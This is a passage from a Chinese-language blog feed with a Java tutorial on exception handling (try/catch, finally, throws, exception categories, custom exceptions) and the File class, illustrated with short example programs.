class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用异常的父类进行catch也可以</p><p>多种异常可以分别解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> sdf.parse(<span class="string">&quot;2016-06-03&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;日期格式解析错误&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以多个异常统一catch解决，但是不能知道是哪一个的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> sdf.parse(<span class="string">&quot;2016-06-03&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException | ParseException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> FileNotFoundException)</span><br><span class="line">                System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ParseException)</span><br><span class="line">                System.out.println(<span class="string">&quot;日期格式解析错误&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="finally">finally</h3><p>无论是否出现异常，finally中的代码都会被执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;无论文件是否存在， 都会执行的代码&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="throws方法">throws方法</h3><p>考虑如下情况：<br>主方法调用method1<br>method1调用method2<br>method2中打开文件</p><p>method2中需要进行异常处理<br>但是method2<strong>不打算处理</strong>，而是把这个异常通过<strong>throws****抛出去</strong><br>那么method1就会<strong>接到该异常</strong>。 处理办法也是两种，要么是try catch处理掉，要么也是<strong>抛出去</strong>。<br>method1选择本地try catch住 一旦try catch住了，就相当于把这个异常消化掉了，主方法在调用method1的时候，就不需要进行异常处理了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        method1();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">        System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>throws与throw这两个关键字接近，不过意义不一样，有如下区别：<br>\1. throws 出现在方法声明上，而throw通常都出现在方法体内。<br>\2. throws 表示出现异常的一种可能性，并不一定会发生这些异常；throw则是抛出了异常，执行throw则一定抛出了某个异常对象。</p><h2 id="异常分类">异常分类</h2><p>可查异常，运行时异常和错误3种<br>其中，运行时异常和错误又叫非可查异常</p><h3 id="可查异常">可查异常</h3><p>CheckedException<br>可查异常即<strong>必须进行处理的异常</strong>，要么try catch住,要么往外抛，谁调用，谁处理，比如 FileNotFoundException<br>如果不处理，编译器，就不让你通过</p><h3 id="运行时异常">运行时异常</h3><p>RuntimeException指： <strong>不是必须进行try catch的异常</strong></p><p><strong>常见运行时异常:</strong><br>除数不能为0异常:ArithmeticException<br>下标越界异常:ArrayIndexOutOfBoundsException<br>空指针异常:NullPointerException<br>在编写代码的时候，依然可以使用try catch throws进行处理，与可查异常不同之处在于，<strong>即便不进行try catch，也不会有编译错误</strong><br>Java之所以会设计运行时异常的原因之一，是因为下标越界，空指针这些运行时异常<strong>太过于普遍</strong>，如果都需要进行捕捉，代码的可读性就会变得很糟糕。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//任何除数不能为0:ArithmeticException</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//下标越界异常：ArrayIndexOutOfBoundsException</span></span><br><span class="line">        <span class="type">int</span> j[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line">        j[<span class="number">10</span>] = <span class="number">10</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//空指针异常：NullPointerException</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        str.length();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="错误">错误</h3><p>错误Error，指的是<strong>系统级别的异常</strong>，通常是内存用光了<br>在<strong>默认设置下</strong>，一般java程序启动的时候，最大可以使用16m的内存<br>如例不停的给StringBuffer追加字符，很快就把内存使用光了。抛出<strong>OutOfMemoryError</strong><br>与运行时异常一样，错误也是不要求强制捕捉的</p><p>代码比较复制代码</p><p><img src="https://stepimagewm.how2j.cn/2412.png" alt="三种分类"></p><h3 id="Throwable">Throwable</h3><p>是类，Exception和Error都继承了该类<br>所以在捕捉的时候，也可以使用Throwable进行捕捉<br>如图： 异常分<strong>Error</strong>和<strong>Exception</strong><br>Exception里又分<strong>运行时异常</strong>和<strong>可查异常</strong>。</p><p><img src="https://stepimagewm.how2j.cn/742.png" alt="Throwable"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            <span class="comment">//使用Throwable进行异常捕捉</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        method1();</span><br><span class="line">      <span class="comment">/*int a=  getresult();</span></span><br><span class="line"><span class="comment">        System.out.println(a);*/</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        File f=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/lol&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getresult</span><span class="params">()</span>&#123;</span><br><span class="line">        File f=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">       &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="自定义异常">自定义异常</h3><p>1.创建一个类EnemyHeroIsDeadException，并继承Exception<br>提供两个构造方法<br>\1. 无参的构造方法<br>\2. 带参的构造方法，并调用父类的对应的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EnemyHeroIsDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attackHero</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyHeroIsDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyHeroIsDeadException</span>(h.name + <span class="string">&quot; 已经挂了,不需要施放技能&quot;</span> );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EnemyHeroIsDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">()</span>&#123;</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        garen.hp = <span class="number">616</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        teemo.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line">        teemo.hp = <span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            garen.attackHero(teemo);</span><br><span class="line">             </span><br><span class="line">        &#125; <span class="keyword">catch</span> (EnemyHeroIsDeadException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            System.out.println(<span class="string">&quot;异常的具体原因:&quot;</span>+e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JAVA-的FILE类，以及常用方法">JAVA 的FILE类，以及常用方法</h2><h3 id="创建文件对象">创建文件对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> file;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFile</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 绝对路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOLFolder&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;f1的绝对路径：&quot;</span> + f1.getAbsolutePath());</span><br><span class="line">        <span class="comment">// 相对路径,相对于工作目录，如果在eclipse中，就是项目目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;LOL.exe&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;f2的绝对路径：&quot;</span> + f2.getAbsolutePath());</span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 把f1作为父目录创建文件对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(f1, <span class="string">&quot;LOL.exe&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;f3的绝对路径：&quot;</span> + f3.getAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习（1）</title>
      <link href="/2024/02/26/python/"/>
      <url>/2024/02/26/python/</url>
      
